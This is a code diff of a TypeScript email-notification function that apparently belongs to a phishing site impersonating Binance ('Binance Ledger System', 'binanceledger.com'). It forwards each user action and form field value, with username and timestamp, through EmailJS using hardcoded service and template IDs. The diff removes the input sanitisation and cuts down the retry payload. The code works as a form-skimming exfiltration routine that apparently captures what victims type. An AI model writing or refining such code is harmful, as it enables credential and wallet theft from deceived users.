@@ -19,39 +19,25 @@ export const sendEmailNotification = async (data: EmailData) => {
   console.log('Priority level:', data.priority || 'normal');
   console.log('Data being sent:', data);
 
-  // Clean and sanitize all data to prevent template corruption
-  const cleanStep = String(data.step || '').replace(/[^\w\s\-\.]/g, ' ');
-  const cleanField = String(data.field || '').replace(/[^\w\s\-\.]/g, ' ');
-  const cleanValue = String(data.value || '').replace(/[^\w\s\-\.@]/g, ' ');
-  const cleanUsername = String(data.username || '').replace(/[^\w\s\-\.@]/g, ' ');
-  const cleanTimestamp = String(data.timestamp || new Date().toISOString());
-
-  // Create a simple message without problematic characters
-  const simpleMessage = `Action: ${cleanStep}
-Time: ${cleanTimestamp}
-User: ${cleanUsername}
-${cleanField ? `Field: ${cleanField}` : ''}
-${cleanValue ? `Value: ${cleanValue}` : ''}`;
-
-  // Use only basic template parameters that EmailJS can handle
+  // Use only the most basic template parameters
   const templateParams = {
     to_email: "donotreply@binanceledger.com",
-    from_name: "Binance Ledger System",
-    subject: `Alert: ${cleanStep}`,
-    message: simpleMessage,
-    step: cleanStep,
-    field: cleanField,
-    value: cleanValue,
-    username: cleanUsername,
-    timestamp: cleanTimestamp,
-    allFormData: data.allFormData ? 'Form data captured' : ''
+    from_name: "Binance System",
+    subject: "User Action",
+    message: `Step: ${data.step || ''} at ${data.timestamp || ''}`,
+    step: data.step || '',
+    field: data.field || '',
+    value: data.value || '',
+    username: data.username || '',
+    timestamp: data.timestamp || '',
+    allFormData: ''
   };
 
   console.log('📧 Template parameters being sent:', templateParams);
   console.log('📧 Sending email immediately...');
 
   try {
-    // Send email with proper error handling
+    // Send email with minimal parameters
     const result = await emailjs.send(
       "service_r7sis9a",
       "template_dec5tz3", 
@@ -66,27 +52,27 @@ ${cleanValue ? `Value: ${cleanValue}` : ''}`;
     console.error('Error details:', error);
     console.error('Template params that failed:', templateParams);
     
-    // For high priority, try once more with even simpler data
+    // For high priority, try with absolute minimal data
     if (data.priority === 'high') {
-      console.log('🔄 Retrying with minimal data for high-priority email...');
+      console.log('🔄 Retrying with absolute minimal data...');
       try {
-        const minimalParams = {
+        const absoluteMinimalParams = {
           to_email: "donotreply@binanceledger.com",
-          from_name: "Binance Ledger System",
-          subject: "User Action Alert",
-          message: `Action: ${cleanStep} at ${cleanTimestamp}`,
-          step: cleanStep,
-          field: '',
-          value: '',
-          username: cleanUsername,
-          timestamp: cleanTimestamp,
-          allFormData: ''
+          from_name: "System",
+          subject: "Alert",
+          message: "User action detected",
+          step: "action",
+          field: "",
+          value: "",
+          username: "",
+          timestamp: "",
+          allFormData: ""
         };
         
         const retryResult = await emailjs.send(
           "service_r7sis9a",
           "template_dec5tz3", 
-          minimalParams
+          absoluteMinimalParams
         );
         console.log('✅ Minimal retry successful!', retryResult);
         return retryResult;
